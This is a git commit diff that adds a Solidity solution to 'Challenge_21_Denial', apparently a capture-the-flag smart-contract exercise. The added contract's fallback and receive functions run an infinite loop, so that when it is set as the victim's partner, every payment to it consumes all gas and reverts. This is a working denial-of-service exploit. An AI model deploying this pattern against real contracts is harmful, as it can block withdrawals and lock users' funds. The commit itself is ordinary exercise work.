f631c824388de005bbb1286e54a6dbc4bcb92cbf
Gakarot <startradingcentre@gmail.com>
2025-05-14 23:42:51 +0530

    Update solution.sol

--- Challenge_21_Denial/solution.sol
+++ Challenge_21_Denial/solution.sol
@@ -1,1 +1,17 @@
+// SPDX-License-Identifier: MIT
+pragma solidity ^0.8.0;
 
+/* Solution:
+// Make a contract that runs infinite loop and add it to the Denial contract as partner.
+// This loop will run until all gas is consumed hence reverting the tx.
+*/
+
+contract MyContract {
+
+    function deposit() public pure {
+        while (true) {}
+    }
+
+    fallback() external payable {deposit();}
+    receive() external payable {deposit();}
+}
